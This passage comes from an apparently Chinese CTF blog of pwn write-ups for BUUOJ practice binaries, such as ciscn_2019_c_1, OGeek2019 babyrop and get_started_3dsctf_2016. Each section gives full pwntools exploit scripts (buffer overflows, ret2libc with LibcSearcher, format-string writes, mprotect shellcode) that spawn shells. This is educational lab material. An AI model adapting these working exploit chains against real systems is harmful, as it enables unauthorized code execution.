<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;ciscn_2019_n_1&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,27338)</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0xc</span>) + p64(<span class="number">0x401348000</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure>

<p>发送payload，得到flag</p>
<p><img src="https://i.loli.net/2020/09/08/bQk98h4CdTyFAa5.png" alt="image.png"></p>
<h2 id="0x006-ciscn-2019-c-1-ret2csu-ret2libc"><a href="#0x006-ciscn-2019-c-1-ret2csu-ret2libc" class="headerlink" title="0x006.ciscn_2019_c_1 - ret2csu + ret2libc"></a>0x006.ciscn_2019_c_1 - ret2csu + ret2libc</h2><p>惯例的<code>checksec</code>，发现只开了NX保护</p>
<p><img src="https://i.loli.net/2020/09/08/pAfovxLnPF3Cicu.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p>在<code>encrypt()</code>函数中我们发现使用了gets进行读入，存在溢出点，但是我们可以观察到这个函数会对我们的输入进行处理，常规的payload会被经过程序奇怪的处理，破坏掉我们的数据<img src="https://i.loli.net/2020/09/08/TXCd5VxRIm2Nbfy.png" alt="image.png"></p>
<p>不过我们可以发现该函数是使用的<code>strlen()</code>函数来判断输入的长度，遇到<code>&#39;\x00&#39;</code>时会终止，而<code>gets()</code>函数遇到<code>&#39;\x00&#39;</code>并不会截断，因此我们可以将payload开头的padding的第一个字符置为<code>&#39;\x00&#39;</code>，这样我们所输入的payload就不会被程序改变</p>
<p>接下来考虑构造rop链getshell，基本上已经是固定套路了，<strong>首先用<code>puts()</code>函数泄漏出<code>puts()</code>的真实地址，同时由于题目没有给出libc文件，故接下来我们考虑用<code>LibcSearcher</code>获取libc，然后libc的基址、<code>/bin/sh</code>和<code>system()</code>的地址就都出来了，配合上csu中的gadget即可getshell</strong></p>
<p>故构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x50</span></span><br><span class="line">enc_addr = <span class="number">0x4009a0</span></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">retn = <span class="number">0x400c84</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span>*(offset-<span class="number">1</span>) + p64(<span class="number">0xdeafbeef</span>) + p64(retn) + p64(retn) + p64(retn) + p64(retn) + p64(retn) + p64(retn) + p64(pop_rdi) + p64(e.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(enc_addr)</span><br><span class="line"><span class="comment">#p = process(&quot;./ciscn_2019_c_1&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27832</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Ciphertext\n\n&#x27;</span>)</span><br><span class="line">s = p.recv(<span class="number">6</span>)</span><br><span class="line">puts_addr = u64(s.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">payload2 = <span class="string">&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span>*(offset-<span class="number">1</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(retn) + p64(pop_rdi) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行我们的exp，成功getshell</p>
<p><img src="https://i.loli.net/2020/09/10/CL1T3UiExsyJbVP.png" alt="image.png"></p>
<blockquote>
<p>发生了很多很玄学的问题（👈其实就是李粗心大意罢le），导致这道题虽然早就有了思路，但是用的时间比预期要长的多</p>
<p>以及LibcSearcher在本地无法getshell，换成本地的libc就好了（玄学问题变多了（<del>其实只是LibcSearcher库不全⑧</del>））</p>
<p>以及Ubuntu 18下偶尔会发生栈无法对齐的情况，多retn几次就好了（确信）</p>
</blockquote>
<h2 id="0x007-OGeek2019-babyrop-ret2libc"><a href="#0x007-OGeek2019-babyrop-ret2libc" class="headerlink" title="0x007.[OGeek2019]babyrop - ret2libc"></a>0x007.[OGeek2019]babyrop - ret2libc</h2><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p>
<p><img src="https://i.loli.net/2020/09/12/nqPDwE5WHeQsmzT.png" alt="image.png"></p>
<p>拖入IDA进行分析：</p>
<p><img src="https://i.loli.net/2020/09/12/51JOmdMVjsgAkWN.png" alt="image.png"></p>
<p>main函数首先会获取一个随机数，传入<code>sub_804871F()</code>中</p>
<p><img src="https://i.loli.net/2020/09/12/Ijk8GHiOgxXWVdn.png" alt="image.png"></p>
<p>该函数会将随机数作为字符串输出到s，之后读取最大0x20个字节的输入到v6，用<code>strlen()</code>计算v6长度存到v1并与s比对v1个字节，若不相同则直接退出程序</p>
<p>考虑到<code>strlen()</code>函数以<code>&#39;\x00&#39;</code>字符作为结束标识符，故我们只需要在输入前放上一个<code>&#39;\x00&#39;</code>即可避开这个检测</p>
<p>之后会将v5的数值返回到主函数并作为参数又给到<code>sub_80487D0()</code>函数，简单看一下我们便可以发现该函数读取最大v5个字节的输入到<code>buf</code>中，而<code>buf</code>距离<code>ebp</code>只有0xe7个字节</p>
<p><img src="https://i.loli.net/2020/09/13/1Y7qukt6NVJlDzd.png" alt="image.png"></p>
<p>由于没有可以直接getshell的函数，故考虑在第一次输入时将v5覆写为<code>0xff</code>以保证能够读取的输入长度最大，在第二次输入时构造rop链使用write函数泄露write的地址，再使用libcsearcher得到libc基址与<code>system()</code>和<code>&quot;/bin/sh&quot;</code>字符串的地址，最后构造rop链调用<code>system(&quot;/bin/sh&quot;)</code>即可getshell</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">write_plt = e.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = e.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload1 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="number">7</span>* <span class="string">b&#x27;\xff&#x27;</span></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0xe7</span> + p32(<span class="number">0xdeadbeef</span>) + p32(write_plt) + p32(<span class="number">0x80487d0</span>) + p32(<span class="number">0x1</span>) + p32(write_got) + p32(<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,25330)</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Correct\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0xe7</span> + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行脚本即可getshell</p>
<p><img src="https://i.loli.net/2020/09/13/SOvMLpHGFVaQfZb.png" alt="image.png"></p>
<h2 id="0x008-jarvisoj-level0-ret2text"><a href="#0x008-jarvisoj-level0-ret2text" class="headerlink" title="0x008.jarvisoj_level0 - ret2text"></a>0x008.jarvisoj_level0 - ret2text</h2><blockquote>
<p>好多重复考点的简单题啊…</p>
</blockquote>
<p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p>
<p><img src="https://i.loli.net/2020/09/18/utzZo2RkpGUC7Yj.png" alt="image.png"></p>
<p>拖入IDA进行分析，可以发现存在一个可以溢出的函数<code>vulnerable_function()</code>，只需要<code>0x80</code>个字节即可溢出</p>
<p><img src="https://i.loli.net/2020/09/18/kFVOigZbem3U1yr.png" alt="image.png"></p>
<p>同时存在一个可以直接getshell的函数<code>callsystem()</code></p>
<p>直接构造payload覆写返回地址到<code>callsystem()</code>函数即可getshell</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x80</span> + p64(<span class="number">0xdeadbeef</span>) + p64(<span class="number">0x400596</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;level0&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,29367)</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/09/18/ykhU4DgzILKvQXG.png" alt="image.png"></p>
<h2 id="0x009-ciscn-2019-en-2-ret2csu-ret2libc"><a href="#0x009-ciscn-2019-en-2-ret2csu-ret2libc" class="headerlink" title="0x009.ciscn_2019_en_2 - ret2csu + ret2libc"></a>0x009.ciscn_2019_en_2 - ret2csu + ret2libc</h2><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p>
<p><img src="https://i.loli.net/2020/09/18/Fv6MeQnd4fU8Rmr.png" alt="image.png"></p>
<p>拖入IDA进行分析<del>感觉这题好像在哪个地方做过的样子</del>（<del>ciscn_2019_c_1</del>）</p>
<p>在<code>encrypt()</code>函数中我们发现使用了gets进行读入，存在溢出点，但是我们可以观察到这个函数会对我们的输入进行处理，常规的payload会被经过程序奇怪的处理，破坏掉我们的数据<img src="https://i.loli.net/2020/09/08/TXCd5VxRIm2Nbfy.png" alt="image.png"></p>
<p>不过我们可以发现该函数是使用的<code>strlen()</code>函数来判断输入的长度，遇到<code>&#39;\x00&#39;</code>时会终止，而<code>gets()</code>函数遇到<code>&#39;\x00&#39;</code>并不会截断，因此我们可以将payload开头的padding的第一个字符置为<code>&#39;\x00&#39;</code>，这样我们所输入的payload就不会被程序改变</p>
<p>接下来考虑构造rop链getshell，基本上已经是固定套路了，<strong>首先用<code>puts()</code>函数泄漏出<code>puts()</code>的真实地址，同时由于题目没有给出libc文件，故接下来我们考虑用<code>LibcSearcher</code>获取libc，然后libc的基址、<code>/bin/sh</code>和<code>system()</code>的地址就都出来了，配合上csu中的gadget即可getshell</strong></p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25348</span>)<span class="comment">#process(&#x27;./ciscn_2019_en_2&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./ciscn_2019_en_2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x400b28</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">retn = <span class="number">0x400c84</span></span><br><span class="line">offset = <span class="number">0x50</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span>*(offset-<span class="number">1</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;text\n\n&#x27;</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span>*(offset-<span class="number">1</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(retn) +p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/09/18/7AoReBMP9Lr3Ojb.png" alt="image.png"></p>
<blockquote>
<p>需要注意的是Ubuntu 18有的时候会存在栈无法对齐的情况，可以多使用几次<code>retn</code>的gadget来对其栈</p>
</blockquote>
<h2 id="0x00A-第五空间2019-决赛-PWN5-fmtstr"><a href="#0x00A-第五空间2019-决赛-PWN5-fmtstr" class="headerlink" title="0x00A.[第五空间2019 决赛]PWN5 - fmtstr"></a>0x00A.[第五空间2019 决赛]PWN5 - fmtstr</h2><p>惯例的<code>checksec</code>，发现开了NX保护和canary</p>
<p><img src="https://i.loli.net/2020/09/18/UyvYwOl6x1RH4hE.png" alt="image.png"></p>
<p>拖入IDA进行分析：</p>
<p><img src="https://i.loli.net/2020/09/18/ZweqQ3kByjGUmVK.png" alt="image.png"></p>
<p>该程序获取一个随机数，读入到<code>0x804c044</code>上，随后两次读入用户输入并判断第二次输入与随机数是否相同，相同则可以获得shell</p>
<p>我们可以发现存在<strong>格式化字符串漏洞</strong>，可以进行<strong>任意地址读与任意地址写</strong>，故考虑将<code>0x804c044</code>地址上的随机数覆写为我们想要的值，随后直接输入我们覆写的值即可getshell</p>
<p>同时我们简单的跑一下这个程序就可以知道格式字符串是位于栈上的第10个参数（”aaaa” &#x3D;&#x3D; 0x61616161）</p>
<p><img src="https://i.loli.net/2020/09/18/Qiglex7ZCfsFhub.png" alt="image.png"></p>
<p>我们可以使用pwntools中的<code>fmtstr_payload()</code>来比较方便地构造能够进行任意地址写的payload</p>
<blockquote>
<p>具体用法可以百度，这里就不再摘抄一遍了</p>
</blockquote>
<p>故构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>,&#123;<span class="number">0x804c044</span>:<span class="number">0x1</span>&#125;)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,25595)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x1</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/09/18/81KUdhp5EWb2JgP.png" alt="image.png"></p>
<h2 id="0x00B-get-started-3dsctf-2016-ret2text-ret2shellcode"><a href="#0x00B-get-started-3dsctf-2016-ret2text-ret2shellcode" class="headerlink" title="0x00B.get_started_3dsctf_2016 - ret2text || ret2shellcode"></a>0x00B.get_started_3dsctf_2016 - ret2text || ret2shellcode</h2><blockquote>
<p>注：这是一道屑题</p>
</blockquote>
<p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p>
<p><img src="https://i.loli.net/2020/09/18/XZEnHkaoDL6puN4.png" alt="image.png"></p>
<p>拖入IDA进行分析，可以发现存在一个赤裸裸的<code>gets()</code>溢出</p>
<p><img src="https://i.loli.net/2020/09/18/KHx7Dz9kULZpIRd.png" alt="image.png"></p>
<p>同时存在一个<code>get_flag()</code>函数可以获取flag，不过要求参数1为<code>0x308cd64f</code>，参数2为<code>0x195719d1</code></p>
<p><img src="https://i.loli.net/2020/09/18/H7PwgMDErGxZcRi.png" alt="image.png"></p>
<h3 id="解法1：ret2text"><a href="#解法1：ret2text" class="headerlink" title="解法1：ret2text"></a>解法1：ret2text</h3><p>32位程序通过栈传参，故构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x38</span> + p32(<span class="number">0x80489A0</span>) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x308CD64F</span>) + p32(<span class="number">0x195719D1</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>不过很明显，出题人的环境很明显有丶小问题🔨🔨🔨，远程跑不通这个payload</p>
<p><img src="https://i.loli.net/2020/10/07/6ZxFokbJUwI2YVS.png" alt="image.png"></p>
<p>问题出在哪呢？该程序尝试打开的是<code>flag.txt</code>文件，但是平台所自动生成的是<code>flag</code>文件，故此种方法<strong>无法获得flag</strong></p>
<p>我们尝试寻找第二种解法</p>
<h3 id="解法2：ret2shellcode"><a href="#解法2：ret2shellcode" class="headerlink" title="解法2：ret2shellcode"></a>解法2：ret2shellcode</h3><p>首先我们发现在程序中编入了大量的函数，其中就包括<code>mprotect()</code>，可以修改指定内存地址的权限</p>
<p><img src="https://i.loli.net/2020/09/19/JX5nSQwg9dFTufU.png" alt="image.png"></p>
<p>故考虑使用<code>mprotect()</code>修改内存段权限为可读可写可运行后在上面写入shellcode并跳转至内存段执行shellcode以getshell</p>
<p>在<strong>pwndbg</strong>中使用<code>vmmap</code>查看可以用的内存段，前面三个段随便选一个就行</p>
<p><img src="https://i.loli.net/2020/09/20/1nXPY9VqgLaQtmR.png" alt="image.png"></p>
<p>需要注意的是我们需要手动将<code>mprotect()</code>的参数弹出（日常踩坑）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,29719)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_ebx_esi_edi_ebp_ret = <span class="number">0x804951c</span></span><br><span class="line">mprotect_addr = e.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read_addr = e.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">sc_addr = <span class="number">0x80ec000</span></span><br><span class="line">offset = <span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>*offset + p32(mprotect_addr) + p32(pop_ebx_esi_edi_ebp_ret) + p32(sc_addr) + p32(<span class="number">0x100</span>) + p32(<span class="number">0x7</span>) + p32(<span class="number">0xdeadbeef</span>)  + p32(read_addr) + p32(sc_addr) + p32(<span class="number">0</span>) + p32(sc_addr) + p32(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">payload2 = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行脚本即可getshell</p>
<p><img src="https://i.loli.net/2020/09/20/dk9jnLSZRt1qwXO.png" alt="image.png"></p>
<h2 id="0x00C-ciscn-2019-n-8-overwrite"><a href="#0x00C-ciscn-2019-n-8-overwrite" class="headerlink" title="0x00C.ciscn_2019_n_8 - overwrite"></a>0x00C.ciscn_2019_n_8 - overwrite</h2><p>惯例的<code>checksec</code>，发现开了<strong>栈不可执行、地址随机化、Canary</strong>三大保护（<del>噔  噔  咚</del></p>
<p><img src="https://i.loli.net/2020/09/20/OqJDm4QUE367nWM.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2020/09/20/2dOMiusme5lUfhc.png" alt="image.png"></p>
<p>使用scanf读入字符串到变量<code>var</code>，存在漏洞，同时程序会将var的地址转换为一个(_QWORD)类型指针（长度为四字节），并判断<code>var[13]</code>是否为<code>0x11</code>，若是则返回一个shell</p>
<p>故考虑直接输入将<code>var[13]</code>覆写为<code>0x11</code>即可getshell</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">13</span>*<span class="number">4</span> + p32(<span class="number">0x11</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_2019_n_8&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,29901)</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/09/20/4RHWBEUrOSaPhXw.png" alt="image.png"></p>
<h2 id="0x00D-not-the-same-3dsctf-2016-ret2shellcode"><a href="#0x00D-not-the-same-3dsctf-2016-ret2shellcode" class="headerlink" title="0x00D.not_the_same_3dsctf_2016 - ret2shellcode"></a>0x00D.not_the_same_3dsctf_2016 - ret2shellcode</h2><blockquote>
<p>not the same（指 the same（</p>
</blockquote>
<p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p>
<p><img src="https://i.loli.net/2020/09/20/lxh7UmuzOJIRvbW.png" alt="image.png"></p>
<p>拖进IDA里康康</p>
<p><img src="https://i.loli.net/2020/09/20/FGmtAInhU9Dcx1a.png" alt="image.png"></p>
<p>主函数中直接存在可以被利用的<code>gets()</code>函数，同时还给了我们一个提示信息——<strong>bora ver se tu ah o bichao memo</strong>，大致可以翻译为：<strong>Did you see the wrong note?</strong><del>看起来似乎没什么用的样子</del></p>
<p>尝试先使用与前一题相同的思路来解</p>
<p>首先用<code>pwndbg</code>的<code>vmmap</code>查看可以用的内存</p>
<p><img src="https://i.loli.net/2020/09/20/3MkHWsKtXChuezG.png" alt="image.png"></p>
<p>同时IDA中我们发现程序中依然存在<code>mprotect()</code>函数可以改写权限</p>
<p><img src="https://i.loli.net/2020/09/20/4IebV5KgXMrA9Go.png" alt="image.png"></p>
<p>和前一题所不同的是gadget的位置有丶小变化（<del>原来只有这个不同🐎</del>）</p>
<p><img src="https://i.loli.net/2020/09/20/b8JLWav12ru9SFE.png" alt="image.png"></p>
<p>故我们可以使用<strong>与前一题几乎完全相同的exp</strong>来getshell，只需要把csu里的gadget的地址稍微修改一下即可</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./not_the_same_3dsctf_2016&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,28147)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_ebx_esi_edi_ebp_ret = <span class="number">0x80494dc</span></span><br><span class="line">mprotect_addr = e.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read_addr = e.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">sc_addr = <span class="number">0x80ea000</span></span><br><span class="line">offset = <span class="number">0x2d</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>*offset + p32(mprotect_addr) + p32(pop_ebx_esi_edi_ebp_ret) + p32(sc_addr) + p32(<span class="number">0x100</span>) + p32(<span class="number">0x7</span>) + p32(<span class="number">0xdeadbeef</span>)  + 